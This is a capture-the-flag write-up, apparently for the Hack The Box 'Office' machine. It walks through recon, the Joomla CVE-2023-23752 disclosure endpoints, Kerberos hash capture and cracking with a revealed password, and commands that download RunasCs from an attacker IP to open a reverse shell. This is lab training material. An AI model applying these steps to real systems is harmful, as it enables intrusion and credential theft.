+++
title = 'Test'
draft = false
+++
# writeup office HTB(user)
## user
### RECON
```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 16 disallowed entries 
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-generator: Joomla! - Open Source Content Management
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
|_http-title: Home
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-02-19 14:34:25Z)
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
..........................................

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38823/tcp): CLEAN (Timeout)
|   Check 2 (port 18395/tcp): CLEAN (Timeout)
|   Check 3 (port 60879/udp): CLEAN (Timeout)
|   Check 4 (port 60573/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 7h59m52s
| smb2-time: 
|   date: 2024-02-19T14:35:21
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 19 01:36:08 2024 -- 1 IP address (1 host up) scanned in 105.60 seconds
```
### web
let check admin page 
![image](https://github.com/vanatka10/myblog/assets/126310360/8cf1bcb3-0cb5-4c13-93c0-a7d89ea5a3f8)

i have login with some default username and password but nothing are corret

let check version joomla
we can check verion with following path:
```
Version
In /administrator/manifests/files/joomla.xml you can see the version.
In /language/en-GB/en-GB.xml you can get the version of Joomla.
In plugins/system/cache/cache.xml you can see an approximate version.
```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla

![image](https://github.com/vanatka10/myblog/assets/126310360/857f9313-2f9e-43d5-a2a7-889871041884)
### CVE-2023-23752
we can easily found cve of this version
![image](https://github.com/vanatka10/myblog/assets/126310360/6607d033-ebe1-4973-a4fd-99226cdf4ce1)

Unauthenticated information disclosure that's exactly what we want.

look at some exploit file we can see it with send request to some uri and retrieve some useful information:
```
{root_url}/api/index.php/v1/users?public=true
{root_url}/api/index.php/v1/config/application?public=true
```
![image](https://github.com/vanatka10/myblog/assets/126310360/7abb26a3-441a-466b-91ad-d538bbf8b461)

https://github.com/Acceis/exploit-CVE-2023-23752.git

![image](https://github.com/vanatka10/myblog/assets/126310360/732f64ad-ec0f-4d26-8215-0f1ea55190dc)

We have some Credentials but i can't login with these :3 . probably password of another user?
kerberos port open so i use kerbrute discover user.  
i got some username, after a few tries and fuzz finally i have working username .It is 'dwolfe' but it just use in smb

### smb
```
smbclient //10.129.198.153/SOC\ Analysis  -U 'dwolfe'
```
and get file pcap

following this article we get username, hash and crack password with hashcat
https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/
```
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

```
hashcat -m 19900 hash.txt /user/share/wordlist/rockyou.txt
```

pass:playboy69

### user

login admin panel -> template and ... get reverse shell
![image](https://github.com/vanatka10/myblog/assets/126310360/aaaf5e9b-a270-4b37-a264-d755805607e1)

next we use runas to elevate an account
```
powershell -c wget 10.10.16.48:9000/RunasCs.exe -o r.exe
./r.exe tstark playboy69 -r 10.10.16.48:8888 cmd


```
![image](https://github.com/vanatka10/myblog/assets/126310360/24571f7e-886b-4cf1-be73-fc13573affc1)

get the flag
![image](https://github.com/vanatka10/myblog/assets/126310360/c356cb70-a650-4ab6-a65b-36748dbc2931)
